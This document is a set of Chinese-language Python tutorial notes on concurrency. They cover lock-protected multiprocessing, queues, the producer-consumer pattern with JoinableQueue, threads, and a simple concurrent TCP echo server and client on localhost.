<p>&#x9488;&#x5BF9;&#x4E0A;&#x8FF0;&#x95EE;&#x9898;&#xFF0C;&#x89E3;&#x51B3;&#x65B9;&#x5F0F;&#x5C31;&#x662F;&#x52A0;&#x9501;&#x5904;&#x7406;:<strong>&#x5C06;&#x5E76;&#x53D1;&#x53D8;&#x6210;&#x4E32;&#x884C;&#xFF0C;&#x727A;&#x7272;&#x6548;&#x7387;&#x4F46;&#x662F;&#x4FDD;&#x8BC1;&#x4E86;&#x6570;&#x636E;&#x7684;&#x5B89;&#x5168;</strong></p>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Lock
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random


<span class="hljs-comment"># &#x67E5;&#x7968;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span><span class="hljs-params">(i)</span>:</span>
    <span class="hljs-comment"># &#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x8BFB;&#x53D6;&#x7968;&#x6570;</span>
    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;data&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,encoding=<span class="hljs-string">&apos;utf8&apos;</span>) <span class="hljs-keyword">as</span> f:
        dic = json.load(f)
    print(<span class="hljs-string">&apos;&#x7528;&#x6237;%s&#x67E5;&#x8BE2;&#x4F59;&#x7968;&#xFF1A;%s&apos;</span>%(i, dic.get(<span class="hljs-string">&apos;ticket_num&apos;</span>)))
    <span class="hljs-comment"># &#x5B57;&#x5178;&#x53D6;&#x503C;&#x4E0D;&#x8981;&#x7528;[]&#x7684;&#x5F62;&#x5F0F; &#x63A8;&#x8350;&#x4F7F;&#x7528;get  &#x4F60;&#x5199;&#x7684;&#x4EE3;&#x7801;&#x6253;&#x6B7B;&#x90FD;&#x4E0D;&#x80FD;&#x62A5;&#x9519;&#xFF01;&#xFF01;&#xFF01;</span>


<span class="hljs-comment"># &#x4E70;&#x7968;  1.&#x5148;&#x67E5; 2.&#x518D;&#x4E70;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">buy</span><span class="hljs-params">(i)</span>:</span>
    <span class="hljs-comment"># &#x5148;&#x67E5;&#x7968;</span>
    <span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;data&apos;</span>,<span class="hljs-string">&apos;r&apos;</span>,encoding=<span class="hljs-string">&apos;utf8&apos;</span>) <span class="hljs-keyword">as</span> f:
        dic = json.load(f)
    <span class="hljs-comment"># &#x6A21;&#x62DF;&#x7F51;&#x7EDC;&#x5EF6;&#x8FDF;</span>
    time.sleep(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))
    <span class="hljs-comment"># &#x5224;&#x65AD;&#x5F53;&#x524D;&#x662F;&#x5426;&#x6709;&#x7968;</span>
    <span class="hljs-keyword">if</span> dic.get(<span class="hljs-string">&apos;ticket_num&apos;</span>) &gt; <span class="hljs-number">0</span>:
        <span class="hljs-comment"># &#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93; &#x4E70;&#x7968;</span>
        dic[<span class="hljs-string">&apos;ticket_num&apos;</span>] -= <span class="hljs-number">1</span>
        <span class="hljs-comment"># &#x5199;&#x5165;&#x6570;&#x636E;&#x5E93;</span>
        <span class="hljs-keyword">with</span> open(<span class="hljs-string">&apos;data&apos;</span>,<span class="hljs-string">&apos;w&apos;</span>,encoding=<span class="hljs-string">&apos;utf8&apos;</span>) <span class="hljs-keyword">as</span> f:
            json.dump(dic,f)
        print(<span class="hljs-string">&apos;&#x7528;&#x6237;%s&#x4E70;&#x7968;&#x6210;&#x529F;&apos;</span>%i)
    <span class="hljs-keyword">else</span>:
        print(<span class="hljs-string">&apos;&#x7528;&#x6237;%s&#x4E70;&#x7968;&#x5931;&#x8D25;&apos;</span>%i)


<span class="hljs-comment"># &#x6574;&#x5408;&#x4E0A;&#x9762;&#x4E24;&#x4E2A;&#x51FD;&#x6570;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(i, mutex)</span>:</span>
    search(i)
    <span class="hljs-comment"># &#x7ED9;&#x4E70;&#x7968;&#x73AF;&#x8282;&#x52A0;&#x9501;&#x5904;&#x7406;</span>
    <span class="hljs-comment"># &#x62A2;&#x9501;</span>
    mutex.acquire()

    buy(i)
    <span class="hljs-comment"># &#x91CA;&#x653E;&#x9501;</span>
    mutex.release()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-comment"># &#x5728;&#x4E3B;&#x8FDB;&#x7A0B;&#x4E2D;&#x751F;&#x6210;&#x4E00;&#x628A;&#x9501; &#x8BA9;&#x6240;&#x6709;&#x7684;&#x5B50;&#x8FDB;&#x7A0B;&#x62A2; &#x8C01;&#x5148;&#x62A2;&#x5230;&#x8C01;&#x5148;&#x4E70;&#x7968;</span>
    mutex = Lock()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):
        p = Process(target=run, args=(i, mutex))
        p.start()
<span class="hljs-string">&quot;&quot;&quot;
&#x6269;&#x5C55; &#x884C;&#x9501; &#x8868;&#x9501;

&#x6CE8;&#x610F;&#xFF1A;
    1.&#x9501;&#x4E0D;&#x8981;&#x8F7B;&#x6613;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x5BB9;&#x6613;&#x9020;&#x6210;&#x6B7B;&#x9501;&#x73B0;&#x8C61;(&#x6211;&#x4EEC;&#x5199;&#x4EE3;&#x7801;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x7528;&#x5230;&#xFF0C;&#x90FD;&#x662F;&#x5185;&#x90E8;&#x5C01;&#x88C5;&#x597D;&#x7684;)
    2.&#x9501;&#x53EA;&#x5728;&#x5904;&#x7406;&#x6570;&#x636E;&#x7684;&#x90E8;&#x5206;&#x52A0;&#x6765;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x5B89;&#x5168;(&#x53EA;&#x5728;&#x4E89;&#x62A2;&#x6570;&#x636E;&#x7684;&#x73AF;&#x8282;&#x52A0;&#x9501;&#x5904;&#x7406;&#x5373;&#x53EF;) 
&quot;&quot;&quot;</span>
</code></pre>
<h4 id="&#x8FDB;&#x7A0B;&#x95F4;&#x901A;&#x4FE1;">&#x8FDB;&#x7A0B;&#x95F4;&#x901A;&#x4FE1;</h4>
<h4 id="&#x961F;&#x5217;queue&#x6A21;&#x5757;">&#x961F;&#x5217;Queue&#x6A21;&#x5757;</h4>
<pre><code class="lang-python"><span class="hljs-string">&quot;&quot;&quot;
&#x7BA1;&#x9053;:subprocess 
    stdin stdout stderr
&#x961F;&#x5217;:&#x7BA1;&#x9053;+&#x9501;

&#x961F;&#x5217;:&#x5148;&#x8FDB;&#x5148;&#x51FA;
&#x5806;&#x6808;:&#x5148;&#x8FDB;&#x540E;&#x51FA;
&quot;&quot;&quot;</span>
<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue

<span class="hljs-comment"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x961F;&#x5217;</span>
q = Queue(<span class="hljs-number">5</span>)  <span class="hljs-comment"># &#x62EC;&#x53F7;&#x5185;&#x53EF;&#x4EE5;&#x4F20;&#x6570;&#x5B57; &#x6807;&#x793A;&#x751F;&#x6210;&#x7684;&#x961F;&#x5217;&#x6700;&#x5927;&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5B58;&#x653E;&#x7684;&#x6570;&#x636E;&#x91CF;</span>

<span class="hljs-comment"># &#x5F80;&#x961F;&#x5217;&#x4E2D;&#x5B58;&#x6570;&#x636E;</span>
q.put(<span class="hljs-number">111</span>)
q.put(<span class="hljs-number">222</span>)
q.put(<span class="hljs-number">333</span>)
<span class="hljs-comment"># print(q.full())  # &#x5224;&#x65AD;&#x5F53;&#x524D;&#x961F;&#x5217;&#x662F;&#x5426;&#x6EE1;&#x4E86;</span>
<span class="hljs-comment"># print(q.empty())  # &#x5224;&#x65AD;&#x5F53;&#x524D;&#x961F;&#x5217;&#x662F;&#x5426;&#x7A7A;&#x4E86;</span>
q.put(<span class="hljs-number">444</span>)
q.put(<span class="hljs-number">555</span>)
<span class="hljs-comment"># print(q.full())  # &#x5224;&#x65AD;&#x5F53;&#x524D;&#x961F;&#x5217;&#x662F;&#x5426;&#x6EE1;&#x4E86;</span>

<span class="hljs-comment"># q.put(666)  # &#x5F53;&#x961F;&#x5217;&#x6570;&#x636E;&#x653E;&#x6EE1;&#x4E86;&#x4E4B;&#x540E; &#x5982;&#x679C;&#x8FD8;&#x6709;&#x6570;&#x636E;&#x8981;&#x653E;&#x7A0B;&#x5E8F;&#x4F1A;&#x963B;&#x585E; &#x76F4;&#x5230;&#x6709;&#x4F4D;&#x7F6E;&#x8BA9;&#x51FA;&#x6765; &#x4E0D;&#x4F1A;&#x62A5;&#x9519;</span>

<span class="hljs-string">&quot;&quot;&quot;
&#x5B58;&#x53D6;&#x6570;&#x636E; &#x5B58;&#x662F;&#x4E3A;&#x4E86;&#x66F4;&#x597D;&#x7684;&#x53D6;
&#x5343;&#x65B9;&#x767E;&#x8BA1;&#x7684;&#x5B58;&#x3001;&#x7B80;&#x5355;&#x5FEB;&#x6377;&#x7684;&#x53D6;

&#x540C;&#x5728;&#x4E00;&#x4E2A;&#x5C4B;&#x6A90;&#x4E0B;
&#x5DEE;&#x8DDD;&#x4E3A;&#x4F55;&#x90A3;&#x4E48;&#x5927;
&quot;&quot;&quot;</span>

<span class="hljs-comment"># &#x53BB;&#x961F;&#x5217;&#x4E2D;&#x53D6;&#x6570;&#x636E;</span>
v1 = q.get()
v2 = q.get()
v3 = q.get()
v4 = q.get()
v5 = q.get()
<span class="hljs-comment"># print(q.empty())</span>
<span class="hljs-comment"># V6 = q.get_nowait()  # &#x6CA1;&#x6709;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x62A5;&#x9519;queue.Empty</span>
<span class="hljs-comment"># v6 = q.get(timeout=3)  # &#x6CA1;&#x6709;&#x6570;&#x636E;&#x4E4B;&#x540E;&#x539F;&#x5730;&#x7B49;&#x5F85;&#x4E09;&#x79D2;&#x4E4B;&#x540E;&#x518D;&#x62A5;&#x9519;  queue.Empty</span>
<span class="hljs-keyword">try</span>:
    v6 = q.get(timeout=<span class="hljs-number">3</span>)
    print(v6)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    print(<span class="hljs-string">&apos;&#x4E00;&#x6EF4;&#x90FD;&#x6CA1;&#x6709;&#x4E86;!&apos;</span>)

<span class="hljs-comment"># # v6 = q.get()  # &#x961F;&#x5217;&#x4E2D;&#x5982;&#x679C;&#x5DF2;&#x7ECF;&#x6CA1;&#x6709;&#x6570;&#x636E;&#x7684;&#x8BDD; get&#x65B9;&#x6CD5;&#x4F1A;&#x539F;&#x5730;&#x963B;&#x585E;</span>
<span class="hljs-comment"># print(v1, v2, v3, v4, v5, v6)</span>

<span class="hljs-string">&quot;&quot;&quot;
q.full()
q.empty()
q.get_nowait()
&#x5728;&#x591A;&#x8FDB;&#x7A0B;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x662F;&#x4E0D;&#x7CBE;&#x786E;
&quot;&quot;&quot;</span>
</code></pre>
<p><img src="C:\Users\batma\AppData\Roaming\Typora\typora-user-images\image-20220913200327605.png" alt="image-20220913200327605"></p>
<h4 id="ipc&#x673A;&#x5236;-&#x6D88;&#x606F;&#x961F;&#x5217;">IPC&#x673A;&#x5236;-&#x6D88;&#x606F;&#x961F;&#x5217;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Queue, Process

<span class="hljs-string">&quot;&quot;&quot;
&#x7814;&#x7A76;&#x601D;&#x8DEF;
    1.&#x4E3B;&#x8FDB;&#x7A0B;&#x8DDF;&#x5B50;&#x8FDB;&#x7A0B;&#x501F;&#x52A9;&#x4E8E;&#x961F;&#x5217;&#x901A;&#x4FE1;
    2.&#x5B50;&#x8FDB;&#x7A0B;&#x8DDF;&#x5B50;&#x8FDB;&#x7A0B;&#x501F;&#x52A9;&#x4E8E;&#x961F;&#x5217;&#x901A;&#x4FE1;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span><span class="hljs-params">(q)</span>:</span>
    q.put(<span class="hljs-string">&apos;&#x6211;&#x662F;23&#x53F7;&#x6280;&#x5E08; &#x5F88;&#x9AD8;&#x5174;&#x4E3A;&#x60A8;&#x670D;&#x52A1;&apos;</span>)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span><span class="hljs-params">(q)</span>:</span>
    print(q.get())


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    q = Queue()
    p = Process(target=producer,args=(q,))
    p1 = Process(target=consumer,args=(q,))
    p.start()
    p1.start()
</code></pre>
<h4 id="&#x751F;&#x4EA7;&#x8005;&#x6D88;&#x8D39;&#x8005;&#x6A21;&#x578B;">&#x751F;&#x4EA7;&#x8005;&#x6D88;&#x8D39;&#x8005;&#x6A21;&#x578B;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Queue, JoinableQueue
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span><span class="hljs-params">(name,food,q)</span>:</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):
        data = <span class="hljs-string">&apos;%s&#x751F;&#x4EA7;&#x4E86;%s%s&apos;</span>%(name,food,i)
        <span class="hljs-comment"># &#x6A21;&#x62DF;&#x5EF6;&#x8FDF;</span>
        time.sleep(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))
        print(data)
        <span class="hljs-comment"># &#x5C06;&#x6570;&#x636E;&#x653E;&#x5165; &#x961F;&#x5217;&#x4E2D;</span>
        q.put(data)


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span><span class="hljs-params">(name,q)</span>:</span>
    <span class="hljs-comment"># &#x6D88;&#x8D39;&#x8005;&#x80C3;&#x53E3;&#x5F88;&#x5927; &#x5149;&#x76D8;&#x884C;&#x52A8;</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        food = q.get()  <span class="hljs-comment"># &#x6CA1;&#x6709;&#x6570;&#x636E;&#x5C31;&#x4F1A;&#x5361;&#x4F4F;</span>
        <span class="hljs-comment"># &#x5224;&#x65AD;&#x5F53;&#x524D;&#x662F;&#x5426;&#x6709;&#x7ED3;&#x675F;&#x7684;&#x6807;&#x8BC6;</span>
        <span class="hljs-comment"># if food is None:break</span>
        time.sleep(random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>))
        print(<span class="hljs-string">&apos;%s&#x5403;&#x4E86;%s&apos;</span>%(name,food))
        q.task_done()  <span class="hljs-comment"># &#x544A;&#x8BC9;&#x961F;&#x5217;&#x4F60;&#x5DF2;&#x7ECF;&#x4ECE;&#x91CC;&#x9762;&#x53D6;&#x51FA;&#x4E86;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E76;&#x4E14;&#x5904;&#x7406;&#x5B8C;&#x6BD5;&#x4E86;</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-comment"># q = Queue()</span>
    q = JoinableQueue()
    p1 = Process(target=producer,args=(<span class="hljs-string">&apos;&#x5927;&#x53A8;egon&apos;</span>,<span class="hljs-string">&apos;&#x5305;&#x5B50;&apos;</span>,q))
    p2 = Process(target=producer,args=(<span class="hljs-string">&apos;&#x9A6C;&#x53C9;&#x866B;tank&apos;</span>,<span class="hljs-string">&apos;&#x6CD4;&#x6C34;&apos;</span>,q))
    c1 = Process(target=consumer,args=(<span class="hljs-string">&apos;&#x6625;&#x54E5;&apos;</span>,q))
    c2 = Process(target=consumer,args=(<span class="hljs-string">&apos;&#x65B0;&#x54E5;&apos;</span>,q))
    p1.start()
    p2.start()
    <span class="hljs-comment"># &#x5C06;&#x6D88;&#x8D39;&#x8005;&#x8BBE;&#x7F6E;&#x6210;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;</span>
    c1.daemon = <span class="hljs-keyword">True</span>
    c2.daemon = <span class="hljs-keyword">True</span>
    c1.start()
    c2.start()
    p1.join()
    p2.join()
    <span class="hljs-comment"># &#x7B49;&#x5F85;&#x751F;&#x4EA7;&#x8005;&#x751F;&#x4EA7;&#x5B8C;&#x6BD5;&#x4E4B;&#x540E; &#x5F80;&#x961F;&#x5217;&#x4E2D;&#x6DFB;&#x52A0;&#x7279;&#x5B9A;&#x7684;&#x7ED3;&#x675F;&#x7B26;&#x53F7;</span>
    <span class="hljs-comment"># q.put(None)  # &#x80AF;&#x5B9A;&#x5728;&#x6240;&#x6709;&#x751F;&#x4EA7;&#x8005;&#x751F;&#x4EA7;&#x7684;&#x6570;&#x636E;&#x7684;&#x672B;&#x5C3E;</span>
    <span class="hljs-comment"># q.put(None)  # &#x80AF;&#x5B9A;&#x5728;&#x6240;&#x6709;&#x751F;&#x4EA7;&#x8005;&#x751F;&#x4EA7;&#x7684;&#x6570;&#x636E;&#x7684;&#x672B;&#x5C3E;</span>
    q.join()  <span class="hljs-comment"># &#x7B49;&#x5F85;&#x961F;&#x5217;&#x4E2D;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x88AB;&#x53D6;&#x5B8C;&#x518D;&#x6267;&#x884C;&#x5F80;&#x4E0B;&#x6267;&#x884C;&#x4EE3;&#x7801;</span>
    <span class="hljs-string">&quot;&quot;&quot;
    JoinableQueue &#x6BCF;&#x5F53;&#x4F60;&#x5F80;&#x8BE5;&#x961F;&#x5217;&#x4E2D;&#x5B58;&#x5165;&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019; &#x5185;&#x90E8;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x8BA1;&#x6570;&#x5668;+1
    &#x6CA1;&#x5F53;&#x4F60;&#x8C03;&#x7528;task_done&#x7684;&#x65F6;&#x5019; &#x8BA1;&#x6570;&#x5668;-1
    q.join() &#x5F53;&#x8BA1;&#x6570;&#x5668;&#x4E3A;0&#x7684;&#x65F6;&#x5019; &#x624D;&#x5F80;&#x540E;&#x8FD0;&#x884C;
    &quot;&quot;&quot;</span>
    <span class="hljs-comment"># &#x53EA;&#x8981;q.join&#x6267;&#x884C;&#x5B8C;&#x6BD5; &#x8BF4;&#x660E;&#x6D88;&#x8D39;&#x8005;&#x5DF2;&#x7ECF;&#x5904;&#x7406;&#x5B8C;&#x6570;&#x636E;&#x4E86;  &#x6D88;&#x8D39;&#x8005;&#x5C31;&#x6CA1;&#x6709;&#x5B58;&#x5728;&#x7684;&#x5FC5;&#x8981;&#x4E86;</span>
</code></pre>
<h4 id="&#x7EBF;&#x7A0B;">&#x7EBF;&#x7A0B;</h4>
<pre><code class="lang-python">    &#x8FDB;&#x7A0B;:&#x8D44;&#x6E90;&#x5355;&#x4F4D;(&#x8D77;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x5728;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x4E2D;&#x5F00;&#x8F9F;&#x4E00;&#x5757;&#x72EC;&#x7ACB;&#x7684;&#x7A7A;&#x95F4;)
    &#x7EBF;&#x7A0B;:&#x6267;&#x884C;&#x5355;&#x4F4D;(&#x771F;&#x6B63;&#x88AB;cpu&#x6267;&#x884C;&#x7684;&#x5176;&#x5B9E;&#x662F;&#x8FDB;&#x7A0B;&#x91CC;&#x9762;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x7EBF;&#x7A0B;&#x6307;&#x7684;&#x5C31;&#x662F;&#x4EE3;&#x7801;&#x7684;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#xFF0C;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E2D;&#x6240;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x8D44;&#x6E90;&#x90FD;&#x627E;&#x6240;&#x5728;&#x7684;&#x8FDB;&#x7A0B;&#x7D22;&#x8981;)

&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5185;&#x53EF;&#x4EE5;&#x5F00;&#x8BBE;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x5728;&#x7528;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5185;&#x5F00;&#x8BBE;&#x591A;&#x4E2A;&#x7EBF;&#x7A0B;&#x65E0;&#x9700;&#x518D;&#x6B21;&#x7533;&#x8BF7;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x64CD;&#x4F5C;
&#x6BCF;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x80AF;&#x5B9A;&#x81EA;&#x5E26;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;
</code></pre>
<p><img src="C:\Users\batma\AppData\Roaming\Typora\typora-user-images\image-20220916112858678.png" alt="image-20220916112858678"></p>
<h4 id="&#x5F00;&#x542F;&#x7EBF;&#x7A0B;&#x7684;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;">&#x5F00;&#x542F;&#x7EBF;&#x7A0B;&#x7684;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;</h4>
<pre><code># from multiprocessing import Process
# from threading import Thread
# import time
#
#
# def task(name):
#     print(&apos;%s is running&apos;%name)
#     time.sleep(1)
#     print(&apos;%s is over&apos;%name)
#
#
# # &#x5F00;&#x542F;&#x7EBF;&#x7A0B;&#x4E0D;&#x9700;&#x8981;&#x5728;main&#x4E0B;&#x9762;&#x6267;&#x884C;&#x4EE3;&#x7801; &#x76F4;&#x63A5;&#x4E66;&#x5199;&#x5C31;&#x53EF;&#x4EE5;
# # &#x4F46;&#x662F;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x4E60;&#x60EF;&#x6027;&#x7684;&#x5C06;&#x542F;&#x52A8;&#x547D;&#x4EE4;&#x5199;&#x5728;main&#x4E0B;&#x9762;
# t = Thread(target=task,args=(&apos;egon&apos;,))
# # p = Process(target=task,args=(&apos;jason&apos;,))
# # p.start()
# t.start()  # &#x521B;&#x5EFA;&#x7EBF;&#x7A0B;&#x7684;&#x5F00;&#x9500;&#x975E;&#x5E38;&#x5C0F; &#x51E0;&#x4E4E;&#x662F;&#x4EE3;&#x7801;&#x4E00;&#x6267;&#x884C;&#x7EBF;&#x7A0B;&#x5C31;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#x4E86;
# print(&apos;&#x4E3B;&apos;)



from threading import Thread
import time


class MyThead(Thread):
    def __init__(self, name):
        &quot;&quot;&quot;&#x9488;&#x5BF9;&#x5237;&#x4E2A;&#x4E0B;&#x5212;&#x7EBF;&#x5F00;&#x5934;&#x53CC;&#x4E0B;&#x6ED1;&#x7EBF;&#x7ED3;&#x5C3E;(__init__)&#x7684;&#x65B9;&#x6CD5; &#x7EDF;&#x4E00;&#x8BFB;&#x6210; &#x53CC;&#x4E0B;init&quot;&quot;&quot;
        # &#x91CD;&#x5199;&#x4E86;&#x522B;&#x4EBA;&#x7684;&#x65B9;&#x6CD5; &#x53C8;&#x4E0D;&#x77E5;&#x9053;&#x522B;&#x4EBA;&#x7684;&#x65B9;&#x6CD5;&#x91CC;&#x6709;&#x5565; &#x4F60;&#x5C31;&#x8C03;&#x7528;&#x7236;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;
        super().__init__()
        self.name = name

    def run(self):
        print(&apos;%s is running&apos;%self.name)
        time.sleep(1)
        print(&apos;egon DSB&apos;)


if __name__ == &apos;__main__&apos;:
    t = MyThead(&apos;egon&apos;)
    t.start()
    print(&apos;&#x4E3B;&apos;)
</code></pre><h4 id="tcp&#x670D;&#x52A1;&#x7AEF;&#x5B9E;&#x73B0;&#x5E76;&#x53D1;&#x7684;&#x6548;&#x679C;">TCP&#x670D;&#x52A1;&#x7AEF;&#x5B9E;&#x73B0;&#x5E76;&#x53D1;&#x7684;&#x6548;&#x679C;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread
<span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process
<span class="hljs-string">&quot;&quot;&quot;
&#x670D;&#x52A1;&#x7AEF;
    1.&#x8981;&#x6709;&#x56FA;&#x5B9A;&#x7684;IP&#x548C;PORT
    2.24&#x5C0F;&#x65F6;&#x4E0D;&#x95F4;&#x65AD;&#x63D0;&#x4F9B;&#x670D;&#x52A1;
    3.&#x80FD;&#x591F;&#x652F;&#x6301;&#x5E76;&#x53D1;

&#x4ECE;&#x73B0;&#x5728;&#x5F00;&#x59CB;&#x8981;&#x517B;&#x6210;&#x4E00;&#x4E2A;&#x770B;&#x6E90;&#x7801;&#x7684;&#x4E60;&#x60EF;
&#x6211;&#x4EEC;&#x524D;&#x671F;&#x8981;&#x7ACB;&#x5FD7;&#x79F0;&#x4E3A;&#x62F7;&#x8D1D;&#x5FCD;&#x8005; &#x5361;&#x5361;&#x897F; &#x4E0D;&#x9700;&#x8981;&#x6709;&#x4EFB;&#x4F55;&#x7684;&#x521B;&#x65B0;
&#x7B49;&#x4F60;&#x62F7;&#x8D1D;&#x5230;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E86; &#x5C31;&#x53EF;&#x4EE5;&#x5F00;&#x53D1;&#x81EA;&#x5DF1;&#x7684;&#x601D;&#x60F3;&#x4E86;
&quot;&quot;&quot;</span>
server =socket.socket()  <span class="hljs-comment"># &#x62EC;&#x53F7;&#x5185;&#x4E0D;&#x52A0;&#x53C2;&#x6570;&#x9ED8;&#x8BA4;&#x5C31;&#x662F;TCP&#x534F;&#x8BAE;</span>
server.bind((<span class="hljs-string">&apos;127.0.0.1&apos;</span>,<span class="hljs-number">8080</span>))
server.listen(<span class="hljs-number">5</span>)


<span class="hljs-comment"># &#x5C06;&#x670D;&#x52A1;&#x7684;&#x4EE3;&#x7801;&#x5355;&#x72EC;&#x5C01;&#x88C5;&#x6210;&#x4E00;&#x4E2A;&#x51FD;&#x6570;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">talk</span><span class="hljs-params">(conn)</span>:</span>
    <span class="hljs-comment"># &#x901A;&#x4FE1;&#x5FAA;&#x73AF;</span>
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        <span class="hljs-keyword">try</span>:
            data = conn.recv(<span class="hljs-number">1024</span>)
            <span class="hljs-comment"># &#x9488;&#x5BF9;mac linux &#x5BA2;&#x6237;&#x7AEF;&#x65AD;&#x5F00;&#x94FE;&#x63A5;&#x540E;</span>
            <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>
            print(data.decode(<span class="hljs-string">&apos;utf-8&apos;</span>))
            conn.send(data.upper())
        <span class="hljs-keyword">except</span> ConnectionResetError <span class="hljs-keyword">as</span> e:
            print(e)
            <span class="hljs-keyword">break</span>
    conn.close()

<span class="hljs-comment"># &#x94FE;&#x63A5;&#x5FAA;&#x73AF;</span>
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    conn, addr = server.accept()  <span class="hljs-comment"># &#x63A5;&#x5BA2;</span>
    <span class="hljs-comment"># &#x53EB;&#x5176;&#x4ED6;&#x4EBA;&#x6765;&#x670D;&#x52A1;&#x5BA2;&#x6237;</span>
    <span class="hljs-comment"># t = Thread(target=talk,args=(conn,))</span>
    t = Process(target=talk,args=(conn,))
    t.start()


<span class="hljs-string">&quot;&quot;&quot;&#x5BA2;&#x6237;&#x7AEF;&quot;&quot;&quot;</span>
<span class="hljs-keyword">import</span> socket


client = socket.socket()
client.connect((<span class="hljs-string">&apos;127.0.0.1&apos;</span>,<span class="hljs-number">8080</span>))

<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    client.send(<span class="hljs-string">b&apos;hello world&apos;</span>)
    data = client.recv(<span class="hljs-number">1024</span>)
    print(data.decode(<span class="hljs-string">&apos;utf-8&apos;</span>))
</code></pre>
<h4 id="&#x7EBF;&#x7A0B;&#x5BF9;&#x8C61;&#x7684;join&#x65B9;&#x6CD5;">&#x7EBF;&#x7A0B;&#x5BF9;&#x8C61;&#x7684;join&#x65B9;&#x6CD5;</h4>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread
<span class="hljs-keyword">import</span> time


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">task</span><span class="hljs-params">(name)</span>:</span>
    print(<span class="hljs-string">&apos;%s is running&apos;</span>%name)
    time.sleep(<span class="hljs-number">3</span>)
    print(<span class="hljs-string">&apos;%s is over&apos;</span>%name)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    t = Thread(target=task,args=(<span class="hljs-string">&apos;egon&apos;</span>,))
    t.start()
    t.join()  <span class="hljs-comment"># &#x4E3B;&#x7EBF;&#x7A0B;&#x7B49;&#x5F85;&#x5B50;&#x7EBF;&#x7A0B;&#x8FD0;&#x884C;&#x7ED3;&#x675F;&#x518D;&#x6267;&#x884C;</span>
    print(<span class="hljs-string">&apos;&#x4E3B;&apos;</span>)
</code></pre>
